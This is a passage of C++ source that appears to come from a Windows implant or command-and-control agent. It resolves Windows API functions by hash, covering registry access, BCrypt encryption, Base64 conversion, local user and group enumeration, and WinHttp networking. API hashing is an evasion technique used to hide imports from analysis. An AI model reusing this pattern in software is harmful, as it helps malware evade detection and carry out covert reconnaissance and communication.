        PVOID pPrivilegeCheck                   = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_PRIVILEGECHECK);
        pProcs->lpPrivilegeCheck                = reinterpret_cast<LPPROC_PRIVILEGECHECK>(pPrivilegeCheck);
        PVOID pRegCloseKey                      = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_REGCLOSEKEY);
        pProcs->lpRegCloseKey                   = reinterpret_cast<LPPROC_REGCLOSEKEY>(pRegCloseKey);
        PVOID pRegEnumKeyExW                    = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_REGENUMKEYEXW);
        pProcs->lpRegEnumKeyExW                 = reinterpret_cast<LPPROC_REGENUMKEYEXW>(pRegEnumKeyExW);
        PVOID pRegOpenKeyExW                    = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_REGOPENKEYEXW);
        pProcs->lpRegOpenKeyExW                 = reinterpret_cast<LPPROC_REGOPENKEYEXW>(pRegOpenKeyExW);
        PVOID pRegQueryInfoKeyW                 = GetProcAddressByHash(hAdvapi32DLL, HASH_FUNC_REGQUERYINFOKEYW);
        pProcs->lpRegQueryInfoKeyW              = reinterpret_cast<LPPROC_REGQUERYINFOKEYW>(pRegQueryInfoKeyW);

        // Bcrypt
        PVOID pBCryptCloseAlgorithmProvider     = GetProcAddressByHash(hBcryptDLL, HASH_FUNC_BCRYPTCLOSEALGORITHMPROVIDER);
        pProcs->lpBCryptCloseAlgorithmProvider  = reinterpret_cast<LPPROC_BCRYPTCLOSEALGORITHMPROVIDER>(pBCryptCloseAlgorithmProvider);
        PVOID pBCryptDecrypt                    = GetProcAddressByHash(hBcryptDLL, HASH_FUNC_BCRYPTDECRYPT);
        pProcs->lpBCryptDecrypt                 = reinterpret_cast<LPPROC_BCRYPTDECRYPT>(pBCryptDecrypt);
        PVOID pBCryptDestroyKey                 = GetProcAddressByHash(hBcryptDLL, HASH_FUNC_BCRYPTDESTROYKEY);
        pProcs->lpBCryptDestroyKey              = reinterpret_cast<LPPROC_BCRYPTDESTROYKEY>(pBCryptDestroyKey);
        PVOID pBCryptEncrypt                    = GetProcAddressByHash(hBcryptDLL, HASH_FUNC_BCRYPTENCRYPT);
        pProcs->lpBCryptEncrypt                 = reinterpret_cast<LPPROC_BCRYPTENCRYPT>(pBCryptEncrypt);
        PVOID pBCryptGenerateSymmetricKey       = GetProcAddressByHash(hBcryptDLL, HASH_FUNC_BCRYPTGENERATESYMMETRICKEY);
        pProcs->lpBCryptGenerateSymmetricKey    = reinterpret_cast<LPPROC_BCRYPTGENERATESYMMETRICKEY>(pBCryptGenerateSymmetricKey);
        PVOID pBCryptGetProperty                = GetProcAddressByHash(hBcryptDLL, HASH_FUNC_BCRYPTGETPROPERTY);
        pProcs->lpBCryptGetProperty             = reinterpret_cast<LPPROC_BCRYPTGETPROPERTY>(pBCryptGetProperty);
        PVOID pBCryptOpenAlgorithmProvider      = GetProcAddressByHash(hBcryptDLL, HASH_FUNC_BCRYPTOPENALGORITHMPROVIDER);
        pProcs->lpBCryptOpenAlgorithmProvider   = reinterpret_cast<LPPROC_BCRYPTOPENALGORITHMPROVIDER>(pBCryptOpenAlgorithmProvider);
        PVOID pBCryptSetProperty                = GetProcAddressByHash(hBcryptDLL, HASH_FUNC_BCRYPTSETPROPERTY);
        pProcs->lpBCryptSetProperty             = reinterpret_cast<LPPROC_BCRYPTSETPROPERTY>(pBCryptSetProperty);

        // Crypt32
        PVOID pCryptBinaryToStringW             = GetProcAddressByHash(hCrypt32DLL, HASH_FUNC_CRYPTBINARYTOSTRINGW);
        pProcs->lpCryptBinaryToStringW          = reinterpret_cast<LPPROC_CRYPTBINARYTOSTRINGW>(pCryptBinaryToStringW);
        PVOID pCryptStringToBinaryW             = GetProcAddressByHash(hCrypt32DLL, HASH_FUNC_CRYPTSTRINGTOBINARYW);
        pProcs->lpCryptStringToBinaryW          = reinterpret_cast<LPPROC_CRYPTSTRINGTOBINARYW>(pCryptStringToBinaryW);

        // Netapi32
        PVOID pNetApiBufferFree                 = GetProcAddressByHash(hNetapi32DLL, HASH_FUNC_NETAPIBUFFERFREE);
        pProcs->lpNetApiBufferFree              = reinterpret_cast<LPPROC_NETAPIBUFFERFREE>(pNetApiBufferFree);
        PVOID pNetLocalGroupEnum                = GetProcAddressByHash(hNetapi32DLL, HASH_FUNC_NETLOCALGROUPENUM);
        pProcs->lpNetLocalGroupEnum             = reinterpret_cast<LPPROC_NETLOCALGROUPENUM>(pNetLocalGroupEnum);
        PVOID pNetUserEnum                      = GetProcAddressByHash(hNetapi32DLL, HASH_FUNC_NETUSERENUM);
        pProcs->lpNetUserEnum                   = reinterpret_cast<LPPROC_NETUSERENUM>(pNetUserEnum);

        // WinHttp
        PVOID pWinHttpCloseHandle               = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPCLOSEHANDLE);
        pProcs->lpWinHttpCloseHandle            = reinterpret_cast<LPPROC_WINHTTPCLOSEHANDLE>(pWinHttpCloseHandle);
        PVOID pWinHttpConnect                   = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPCONNECT);
        pProcs->lpWinHttpConnect                = reinterpret_cast<LPPROC_WINHTTPCONNECT>(pWinHttpConnect);
        PVOID pWinHttpOpen                      = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPOPEN);
        pProcs->lpWinHttpOpen                   = reinterpret_cast<LPPROC_WINHTTPOPEN>(pWinHttpOpen);
        PVOID pWinHttpOpenRequest               = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPOPENREQUEST);
        pProcs->lpWinHttpOpenRequest            = reinterpret_cast<LPPROC_WINHTTPOPENREQUEST>(pWinHttpOpenRequest);
        PVOID pWinHttpQueryDataAvailable        = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPQUERYDATAAVAILABLE);
        pProcs->lpWinHttpQueryDataAvailable     = reinterpret_cast<LPPROC_WINHTTPQUERYDATAAVAILABLE>(pWinHttpQueryDataAvailable);
        PVOID pWinHttpQueryHeaders              = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPQUERYHEADERS);
        pProcs->lpWinHttpQueryHeaders           = reinterpret_cast<LPPROC_WINHTTPQUERYHEADERS>(pWinHttpQueryHeaders);
        PVOID pWinHttpReceiveResponse           = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPRECEIVERESPONSE);
        pProcs->lpWinHttpReceiveResponse        = reinterpret_cast<LPPROC_WINHTTPRECEIVERESPONSE>(pWinHttpReceiveResponse);
        PVOID pWinHttpReadData                  = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPREADDATA);
        pProcs->lpWinHttpReadData               = reinterpret_cast<LPPROC_WINHTTPREADDATA>(pWinHttpReadData);
        PVOID pWinHttpSendRequest               = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPSENDREQUEST);
        pProcs->lpWinHttpSendRequest            = reinterpret_cast<LPPROC_WINHTTPSENDREQUEST>(pWinHttpSendRequest);
        PVOID pWinHttpSetOption                 = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPSETOPTION);
        pProcs->lpWinHttpSetOption              = reinterpret_cast<LPPROC_WINHTTPSETOPTION>(pWinHttpSetOption);
        PVOID pWinHttpWriteData                 = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPWRITEDATA);
        pProcs->lpWinHttpWriteData              = reinterpret_cast<LPPROC_WINHTTPWRITEDATA>(pWinHttpWriteData);
    }
}
